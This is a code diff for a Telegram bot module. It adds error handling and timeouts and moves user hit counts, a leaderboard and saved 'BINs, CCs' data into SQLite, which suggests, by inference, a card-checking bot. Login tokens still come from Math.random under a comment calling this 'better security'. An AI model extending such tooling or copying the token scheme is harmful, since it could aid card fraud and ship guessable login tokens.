@@ -5,8 +5,25 @@
 
 const TELEGRAM_API = 'https://api.telegram.org/bot';
 
+// Database instance (will be injected)
+let db = null;
+
+// Set database instance
+function setDatabase(databaseInstance) {
+  db = databaseInstance;
+}
+
 async function sendMessage(botToken, chatId, text, opts = {}) {
-  if (!botToken || !chatId) return { ok: false, error: 'Missing bot token or chat_id' };
+  if (!botToken || !chatId) {
+    console.error('sendMessage: Missing bot token or chat_id');
+    return { ok: false, error: 'Missing bot token or chat_id' };
+  }
+
+  if (!text || typeof text !== 'string') {
+    console.error('sendMessage: Invalid text parameter');
+    return { ok: false, error: 'Invalid text parameter' };
+  }
+
   try {
     const url = `${TELEGRAM_API}${botToken}/sendMessage`;
     const body = {
@@ -15,24 +32,66 @@ async function sendMessage(botToken, chatId, text, opts = {}) {
       parse_mode: 'HTML',
       ...opts,
     };
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+
     const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
+      signal: controller.signal,
     });
-    const data = await res.json();
+
+    clearTimeout(timeoutId);
+
+    if (!res.ok) {
+      const errorText = await res.text().catch(() => 'Unknown error');
+      console.error(`sendMessage: HTTP ${res.status}: ${errorText}`);
+      return { ok: false, error: `HTTP ${res.status}: ${errorText}` };
+    }
+
+    const data = await res.json().catch(() => ({ ok: false, description: 'Invalid JSON response' }));
+
+    if (!data.ok) {
+      console.error('sendMessage: Telegram API error:', data.description);
+    }
+
     return { ok: data.ok, error: data.description };
   } catch (e) {
-    return { ok: false, error: e.message };
+    if (e.name === 'AbortError') {
+      console.error('sendMessage: Request timeout');
+      return { ok: false, error: 'Request timeout' };
+    }
+    console.error('sendMessage: Network error:', e.message);
+    return { ok: false, error: `Network error: ${e.message}` };
   }
 }
 
 async function sendPhoto(botToken, chatId, photoBase64, caption) {
-  if (!botToken || !chatId || !photoBase64) return { ok: false, error: 'Missing bot token, chat_id or photo' };
+  if (!botToken || !chatId || !photoBase64) {
+    console.error('sendPhoto: Missing bot token, chat_id or photo');
+    return { ok: false, error: 'Missing bot token, chat_id or photo' };
+  }
+
   try {
     const FormData = require('form-data');
     const base64Data = String(photoBase64).replace(/^data:image\/\w+;base64,/, '');
+
+    // Validate base64 format
+    if (!/^[A-Za-z0-9+/]*={0,2}$/.test(base64Data)) {
+      console.error('sendPhoto: Invalid base64 format');
+      return { ok: false, error: 'Invalid base64 image format' };
+    }
+
     const buffer = Buffer.from(base64Data, 'base64');
+
+    // Check if buffer is valid image (basic size check)
+    if (buffer.length < 100) {
+      console.error('sendPhoto: Image data too small');
+      return { ok: false, error: 'Invalid image data' };
+    }
+
     const form = new FormData();
     form.append('chat_id', String(chatId).replace(/\D/g, '') || chatId);
     form.append('photo', buffer, { filename: 'screenshot.png', contentType: 'image/png' });
@@ -40,16 +99,41 @@ async function sendPhoto(botToken, chatId, photoBase64, caption) {
       form.append('caption', caption);
       form.append('parse_mode', 'HTML');
     }
+
     const url = `${TELEGRAM_API}${botToken}/sendPhoto`;
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 second timeout for images
+
     const res = await fetch(url, {
       method: 'POST',
       body: form,
       headers: form.getHeaders(),
+      signal: controller.signal,
     });
-    const data = await res.json();
+
+    clearTimeout(timeoutId);
+
+    if (!res.ok) {
+      const errorText = await res.text().catch(() => 'Unknown error');
+      console.error(`sendPhoto: HTTP ${res.status}: ${errorText}`);
+      return { ok: false, error: `HTTP ${res.status}: ${errorText}` };
+    }
+
+    const data = await res.json().catch(() => ({ ok: false, description: 'Invalid JSON response' }));
+
+    if (!data.ok) {
+      console.error('sendPhoto: Telegram API error:', data.description);
+    }
+
     return { ok: data.ok, error: data.description };
   } catch (e) {
-    return { ok: false, error: e.message };
+    if (e.name === 'AbortError') {
+      console.error('sendPhoto: Request timeout');
+      return { ok: false, error: 'Request timeout' };
+    }
+    console.error('sendPhoto: Error:', e.message);
+    return { ok: false, error: `Error: ${e.message}` };
   }
 }
 
@@ -63,7 +147,8 @@ const loginTokenByTgId = new Map(); // tg_id -> token (for cleanup)
 const LOGIN_TOKEN_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
 
 function generateLoginToken(tgId, firstName) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  // Use alphanumeric characters for better security (36^12 vs 26^12 combinations)
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   let token = '';
   for (let i = 0; i < 12; i++) token += chars[Math.floor(Math.random() * chars.length)];
   const expiresAt = Date.now() + LOGIN_TOKEN_TTL_MS;
@@ -126,66 +211,143 @@ function verifyOTP(tgId, token) {
   return valid;
 }
 
-// User hits store (tg_id -> count) and global hits
-const userHitsStore = new Map();
-const userNamesStore = new Map(); // tg_id -> firstName (for scoreboard)
-let globalHits = 0;
-
+// User hits and names (stored in database)
 function getUserHits(tgId) {
-  return userHitsStore.get(String(tgId)) || 0;
+  if (!db) return 0;
+  try {
+    const result = db.prepare('SELECT hits FROM telegram_users WHERE tg_id = ?').get(String(tgId));
+    return result ? result.hits : 0;
+  } catch (error) {
+    console.error('Error getting user hits:', error);
+    return 0;
+  }
 }
 
 function getGlobalHits() {
-  return globalHits;
+  if (!db) return 0;
+  try {
+    const result = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();
+    return result ? result.total || 0 : 0;
+  } catch (error) {
+    console.error('Error getting global hits:', error);
+    return 0;
+  }
 }
 
 function incrementUserHits(tgId) {
+  if (!db) return;
   const id = String(tgId);
-  const cur = userHitsStore.get(id) || 0;
-  userHitsStore.set(id, cur + 1);
-  globalHits++;
+  try {
+    // First ensure user exists
+    db.prepare(`
+      INSERT OR IGNORE INTO telegram_users (tg_id, name, hits)
+      VALUES (?, ?, 0)
+    `).run(id, getUserName(tgId));
+
+    // Then increment hits
+    db.prepare(`
+      UPDATE telegram_users
+      SET hits = hits + 1, updated_at = CURRENT_TIMESTAMP
+      WHERE tg_id = ?
+    `).run(id);
+  } catch (error) {
+    console.error('Error incrementing user hits:', error);
+  }
 }
 
 function setUserName(tgId, firstName) {
-  if (tgId && firstName) userNamesStore.set(String(tgId), String(firstName));
+  if (!db || !tgId || !firstName) return;
+  const id = String(tgId);
+  const name = String(firstName);
+  try {
+    db.prepare(`
+      INSERT INTO telegram_users (tg_id, name, hits)
+      VALUES (?, ?, COALESCE((SELECT hits FROM telegram_users WHERE tg_id = ?), 0))
+      ON CONFLICT(tg_id) DO UPDATE SET
+        name = excluded.name,
+        updated_at = CURRENT_TIMESTAMP
+    `).run(id, name, id);
+  } catch (error) {
+    console.error('Error setting user name:', error);
+  }
 }
 
 function getUserName(tgId) {
-  return userNamesStore.get(String(tgId)) || 'User';
+  if (!db) return 'User';
+  try {
+    const result = db.prepare('SELECT name FROM telegram_users WHERE tg_id = ?').get(String(tgId));
+    return result ? result.name : 'User';
+  } catch (error) {
+    console.error('Error getting user name:', error);
+    return 'User';
+  }
 }
 
 function getTopUsers(limit = 10) {
-  const entries = [...userHitsStore.entries()]
-    .filter(([, hits]) => hits > 0)
-    .sort((a, b) => b[1] - a[1])
-    .slice(0, limit);
-  return entries.map(([tgId, hits]) => ({
-    tg_id: tgId,
-    name: getUserName(tgId),
-    hits,
-  }));
+  if (!db) return [];
+  try {
+    const results = db.prepare(`
+      SELECT tg_id, name, hits
+      FROM telegram_users
+      WHERE hits > 0
+      ORDER BY hits DESC
+      LIMIT ?
+    `).all(limit);
+
+    return results.map(row => ({
+      tg_id: row.tg_id,
+      name: row.name || 'User',
+      hits: row.hits,
+    }));
+  } catch (error) {
+    console.error('Error getting top users:', error);
+    return [];
+  }
 }
 
 function getUserRank(tgId) {
-  const sorted = [...userHitsStore.entries()]
-    .filter(([, hits]) => hits > 0)
-    .sort((a, b) => b[1] - a[1]);
-  const idx = sorted.findIndex(([id]) => id === String(tgId));
-  return idx === -1 ? null : idx + 1;
+  if (!db) return null;
+  try {
+    const result = db.prepare(`
+      SELECT COUNT(*) + 1 as rank
+      FROM telegram_users
+      WHERE hits > (SELECT hits FROM telegram_users WHERE tg_id = ?)
+    `).get(String(tgId));
+
+    return result ? result.rank : null;
+  } catch (error) {
+    console.error('Error getting user rank:', error);
+    return null;
+  }
 }
 
-// User data store (tg_id -> { savedBins, savedCards, ... }) - BINs, CCs, prefs
-const userDataStore = new Map();
-
+// User data store (stored in database) - BINs, CCs, prefs
 function setUserData(tgId, data) {
-  if (!tgId || typeof data !== 'object') return;
+  if (!db || !tgId || typeof data !== 'object') return;
   const id = String(tgId);
-  const existing = userDataStore.get(id) || {};
-  userDataStore.set(id, { ...existing, ...data });
+  try {
+    const jsonData = JSON.stringify(data);
+    db.prepare(`
+      INSERT INTO telegram_user_data (tg_id, data_json, updated_at)
+      VALUES (?, ?, CURRENT_TIMESTAMP)
+      ON CONFLICT(tg_id) DO UPDATE SET
+        data_json = excluded.data_json,
+        updated_at = CURRENT_TIMESTAMP
+    `).run(id, jsonData);
+  } catch (error) {
+    console.error('Error setting user data:', error);
+  }
 }
 
 function getUserData(tgId) {
-  return userDataStore.get(String(tgId)) || null;
+  if (!db) return null;
+  try {
+    const result = db.prepare('SELECT data_json FROM telegram_user_data WHERE tg_id = ?').get(String(tgId));
+    return result ? JSON.parse(result.data_json) : null;
+  } catch (error) {
+    console.error('Error getting user data:', error);
+    return null;
+  }
 }
 
 async function answerCallbackQuery(botToken, callbackQueryId, text) {
@@ -237,6 +399,7 @@ const MAIN_MENU_KEYBOARD = {
 };
 
 module.exports = {
+  setDatabase,
   sendMessage,
   sendPhoto,
   editMessageText,
